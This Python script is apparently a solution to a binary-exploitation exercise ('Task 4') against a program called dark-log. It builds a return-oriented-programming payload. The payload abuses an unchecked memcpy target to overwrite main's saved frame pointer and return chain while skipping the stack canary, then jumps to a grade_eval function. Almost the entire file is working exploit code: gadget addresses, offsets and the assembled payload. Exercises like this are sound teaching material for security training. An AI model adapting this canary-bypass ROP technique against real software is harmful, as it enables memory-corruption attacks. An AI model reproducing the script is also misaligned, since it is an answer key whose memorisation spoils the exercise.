#!/usr/bin/env python3
"""Task 4: bypass dark-log's stack canary using its unchecked memcpy target."""
import sys
import struct

POP_RDI_RET = 0x4018A3  # 5f c3, decoded from the second byte of `pop r15`
RET = 0x4018A4          # alignment gadget
GRADE_EVAL = 0x401677
LOG_TO_MAIN_SAVED_RBP = 0xC0

# The first 128 bytes are both gets()'s expression and memcpy()'s source.
# memcpy copies them to logMsg + 0xc0, which starts at main's saved rbp;
# thus input()'s canary at [rbp-8] is never written.
rop_source = (
    struct.pack("<Q", 0)             # replacement for main's saved rbp
    + struct.pack("<Q", POP_RDI_RET)
    + struct.pack("<Q", 4)
    + struct.pack("<Q", RET)         # preserve ABI stack alignment
    + struct.pack("<Q", GRADE_EVAL)
    + struct.pack("<Q", 0)           # grade_eval's return address (unused)
).ljust(128, b"A")

# Offset 256 from expression is f.len.  gets() appends its NUL at offset 260,
# inside f.pad, before it reaches input()'s canary.
payload = rop_source + b"B" * 128 + struct.pack("<I", LOG_TO_MAIN_SAVED_RBP)

sys.stdout.buffer.write(payload + b"\n")
